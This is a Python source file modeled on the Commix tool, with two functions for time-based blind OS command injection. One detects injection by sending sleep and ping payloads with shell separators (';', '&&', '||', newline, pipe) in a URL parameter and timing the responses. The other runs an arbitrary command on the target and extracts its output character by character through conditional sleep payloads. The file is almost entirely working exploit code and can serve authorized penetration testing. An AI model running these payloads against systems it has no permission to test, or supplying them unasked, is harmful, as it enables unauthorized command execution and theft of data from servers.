import urllib.request
import urllib.parse
import time
import string
import random

def test_blind_injection(url, param, delay=5):
    """Time-based blind OS command injection detection.
    Injects sleep/ping delay payloads with multiple separators and measures
    response time delta to infer command execution. Modeled after Commix
    tb_injector with separator-specific payload construction.
    Returns dict with 'vulnerable', 'separator', 'delay_observed'."""
    THRESHOLD_RATIO = 0.75
    SEPARATORS = [';', '&&', '||', '%0a', '|']
    DELAY_CMDS = [
        'sleep {d}',
        'ping -c {d} 127.0.0.1',
    ]
    # Establish baseline response time
    baseline_url = url + '?' + urllib.parse.urlencode({param: 'baseline_test'})
    req = urllib.request.Request(baseline_url)
    req.add_header('User-Agent', 'Mozilla/5.0')
    start = time.monotonic()
    try:
        urllib.request.urlopen(req, timeout=delay + 15)
    except Exception:
        pass
    baseline = time.monotonic() - start
    for sep in SEPARATORS:
        for delay_tpl in DELAY_CMDS:
            delay_cmd = delay_tpl.format(d=delay)
            if sep == '&&':
                payload = urllib.parse.quote('&') + ' true ' + urllib.parse.quote('&&') + ' ' + delay_cmd
            elif sep == '||':
                payload = '| false ' + sep + ' ' + delay_cmd
            elif sep == '%0a':
                payload = '%0a' + urllib.parse.quote(delay_cmd, safe='')
            else:
                payload = sep + ' ' + delay_cmd
            target_url = url + '?' + urllib.parse.urlencode({param: 'x'}) + urllib.parse.quote(payload, safe='%')
            req = urllib.request.Request(target_url)
            req.add_header('User-Agent', 'Mozilla/5.0')
            start = time.monotonic()
            try:
                urllib.request.urlopen(req, timeout=delay + 15)
            except Exception:
                pass
            elapsed = time.monotonic() - start
            time_delta = elapsed - baseline
            if time_delta >= delay * THRESHOLD_RATIO:
                return {'vulnerable': True, 'separator': sep, 'delay_observed': round(time_delta, 2), 'delay_cmd': delay_cmd}
    return {'vulnerable': False, 'separator': None, 'delay_observed': 0}

def blind_extract_char(url, param, separator, command, position, delay=5):
    """Extract a single character at position via time-based comparison.
    Uses Commix-style approach: capture output, substr, compare ASCII value
    per character with conditional sleep."""
    THRESHOLD = delay * 0.75
    for ascii_val in range(32, 127):
        inject = '{sep} export TMP=$({cmd});CH=$(expr substr "$TMP" {pos} 1);DEC=$(printf \'%d\' "\'{ch}\'$CH");if [ $DEC -eq {asc} ];then sleep {d};fi'.format(
            sep=separator, cmd=command, pos=position, ch='', asc=ascii_val, d=delay)
        target_url = url + '?' + urllib.parse.urlencode({param: 'x' + inject})
        req = urllib.request.Request(target_url)
        req.add_header('User-Agent', 'Mozilla/5.0')
        start = time.monotonic()
        try:
            urllib.request.urlopen(req, timeout=delay + 10)
        except Exception:
            pass
        if time.monotonic() - start >= delay + THRESHOLD:
            return chr(ascii_val)
    return None

